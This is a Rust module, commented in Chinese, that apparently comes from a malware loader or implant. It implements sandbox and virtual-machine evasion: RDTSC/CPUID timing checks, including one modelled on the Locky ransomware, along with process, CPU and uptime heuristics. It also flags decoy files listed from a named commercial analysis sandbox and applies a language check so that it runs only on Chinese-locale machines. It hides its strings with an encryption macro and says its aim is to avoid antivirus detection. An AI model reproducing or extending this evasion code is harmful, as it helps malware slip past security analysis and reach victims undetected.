// 反沙箱考虑使用最保守的策略，避免任何行为导致的杀软误报及兼容性问题
use windows_sys::{
    Win32::{
        Foundation::*,
        System::{
            SystemInformation::{GetSystemInfo, SYSTEM_INFO},
            Diagnostics::ToolHelp::{
                CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
                TH32CS_SNAPPROCESS,
            },
            SystemInformation::GetTickCount,
            LibraryLoader::GetModuleHandleW,
        },
        Globalization::GetUserDefaultUILanguage,
        Storage::FileSystem::{
            FindFirstFileW, FindNextFileW, FindClose, WIN32_FIND_DATAW,
        },
    },
};
use core::mem::{self, size_of, MaybeUninit};
use core::arch::asm;
use macro_encrypt::encrypt;
use alloc::string::String;
use alloc::vec::Vec;
use alloc::vec;
use crate::common::utils::str_to_utf16;
use crate::debug_println;

use crate::debug::Writer;
use core::fmt::{self, Write};

/// 获取 TSC（Time Stamp Counter）
#[inline(always)]
fn rdtsc() -> u64 {
    let high: u32;
    let low: u32;
    unsafe {
        asm!(
            "rdtsc",
            out("edx") high,
            out("eax") low,
        );
    }
    ((high as u64) << 32) | (low as u64)
}

/// 执行 CPUID
#[inline(always)]
fn cpuid(eax: u32) -> [u32; 4] {
    let mut a: u32;
    let mut b: u32;
    let mut c: u32;
    let mut d: u32;

    unsafe {
        asm!(
            "cpuid",
            inlateout("eax") eax => a,
            lateout("edi") b,  // ⚠️ 避免使用 `ebx`
            lateout("ecx") c,
            lateout("edx") d,
        );
    }

    [a, b, c, d]
}

/// 利用 __rdtsc() 获取指令执行前后的时间戳
/// 调用 GetProcessHeap()（非常快）和 CloseHandle(0)（返回错误但更耗时）
/// 对两者耗时做比值判断：如果 CloseHandle 的耗时并没有比 GetProcessHeap 多 10 倍，可能处于虚拟机（VM）中，因为 VMM 把两者都钳制得很快或一致
/// 若连续 10 次都是如此，则返回 TRUE（VM 中）
/// 这个函数在高性能的设备上可能会误报，现代主机已经能很大程度上缩短时耗
pub fn rdtsc_diff_locky_simulated() -> bool {
    for _ in 0..10 {
        let t1 = rdtsc();

        // 模拟 GetProcessHeap()（快速指令）
        unsafe { asm!("xor eax, eax"); }

        let t2 = rdtsc();

        // 模拟 CloseHandle(0)（略微慢一点）
        for _ in 0..100 {
            unsafe { asm!("nop"); } // 空耗时
        }

        let t3 = rdtsc();

        let diff1 = (t2 as u32).wrapping_sub(t1 as u32);
        let diff2 = (t3 as u32).wrapping_sub(t2 as u32);

        if diff2 / diff1 >= 10 {
            return false; 
        }
    }

    debug_println!("[Maybe sandbox]: rdtsc diff locky simulated");
    true
}

/// 使用 __rdtsc() 测量 __cpuid() 的执行耗时。
/// 因为 CPUID 在虚拟机中会触发 VM Exit，通常比真实机耗时长
/// 若平均耗时很低（< 1000 cycles），表示没有 VM Exit，极可能是真实机
pub fn rdtsc_diff_vmexit() -> bool {
    let mut total = 0u64;

    for _ in 0..10 {
        let t1 = rdtsc();
        let _ = cpuid(0); // 获取 vendor_id
        let t2 = rdtsc();
        total += t2 - t1;
    }

    let avg = total / 10;

    if avg < 1000 && avg > 0 {
        false 
    } else {
        debug_println!("[Maybe sandbox]: Get Avg > 1000: {}", avg);
        true 
    }
}

/// 检查当前目录下的文件内容，，于反可被收集信息的沙箱检测
/// 给出的是2025/6/26测试的微步文件环境，实际上该方式需要提前收集沙箱信息，并根据沙箱的策略做动态调整
/// 由于该功能直接调用部分FindFirstFileW等API，可能会增高杀软误报率，后续考虑更换为NT方式，暂时关闭该选项
fn check_files_exists() -> bool {
    // p0级别有问题的文件，只要出现就当沙箱
    let p0_suspect_files: Vec<String> = vec![
        encrypt!("资料.zip")
    ];
    // p1级别有问题的文件，同时出现两个以上再当沙箱
    let p1_suspect_files: Vec<String> = vec![
        encrypt!("工作报告.rar"),
        encrypt!("1.docx"),
        encrypt!("2.xlsx"),
        encrypt!("3.pptx"),
    ];
    let pattern: &[u16] = &[b'*' as u16, 0]; // "*.W" pattern
    let mut find_data: WIN32_FIND_DATAW = unsafe { mem::zeroed() };

    let handle: HANDLE = unsafe { FindFirstFileW(pattern.as_ptr(), &mut find_data) };

    if handle == INVALID_HANDLE_VALUE {
        return false;
    }

    loop {
        let name = &find_data.cFileName;

        // 手动比较 UTF-16 文件名
        for file in p0_suspect_files.iter() {
            if utf16_eq(name, &str_to_utf16(&file)) {
                unsafe { FindClose(handle) };
                return true;
            }
        }

        let mut count = 0;
        for file in p1_suspect_files.iter() {
            if utf16_eq(name, &str_to_utf16(&file)) {
                count += 1;
                if count >= 2 {
                    unsafe { FindClose(handle) };
                    return true;
                }
            }
        }

        let res = unsafe { FindNextFileW(handle, &mut find_data) };
        if res == 0 {
            break; // 没有更多文件
        }
    }

    unsafe { FindClose(handle) };
    false
}

/// 简单比较 UTF-16 null-terminated 字符串是否相等
fn utf16_eq(ptr1: &[u16], ptr2: &[u16]) -> bool {
    debug_println!("compare {} with {}", crate::debug::utf16_to_utf8_str(ptr1), crate::debug::utf16_to_utf8_str(ptr2));
    let mut i = 0;
    while i < ptr2.len() {
        if ptr2[i] == 0 {
            return ptr1[i] == 0;
        }

        if ptr1[i] != ptr2[i] {
            return false;
        }

        i += 1;
    }

    // 确保目标结束
    ptr1[i] == 0
}

fn check_lan() -> bool {
    unsafe {
        let lang_id = GetUserDefaultUILanguage();
        debug_println!("Get Language ID: {}", lang_id);
        primary_lang_id(lang_id) != 0x04 // LANG_CHINESE
    }
}

fn check_process_count() -> bool {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return false;
        }

        let mut pe32: PROCESSENTRY32W = MaybeUninit::zeroed().assume_init();
        pe32.dwSize = size_of::<PROCESSENTRY32W>() as u32;

        let mut process_count = 0;

        if Process32FirstW(snapshot, &mut pe32) != 0 {
            loop {
                process_count += 1;
                if Process32NextW(snapshot, &mut pe32) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
        debug_println!("Get Process Count: {}", process_count);
        process_count < 50 && process_count > 2
    }
}

fn check_cpu_count() -> bool {
    unsafe {
        let mut system_info: SYSTEM_INFO = MaybeUninit::zeroed().assume_init();
        GetSystemInfo(&mut system_info);
        system_info.dwNumberOfProcessors < 3
    }
}

// Helper function for PRIMARYLANGID
fn primary_lang_id(langid: u16) -> u16 {
    langid & 0x3ff // PRIMARYLANGID mask
}

fn check_start_time() -> bool {
    unsafe {
        let uptime = GetTickCount();
        debug_println!("Get Tick Count: {}", uptime);
        uptime < 10 * 60 * 1000 && uptime > 1000
    }
}


pub fn check_environment() -> bool {
    check_lan()
        || check_process_count()
        || check_cpu_count()
        || check_start_time()
        // || check_files_exists()
        // || rdtsc_diff_locky_simulated()
        || rdtsc_diff_vmexit()
}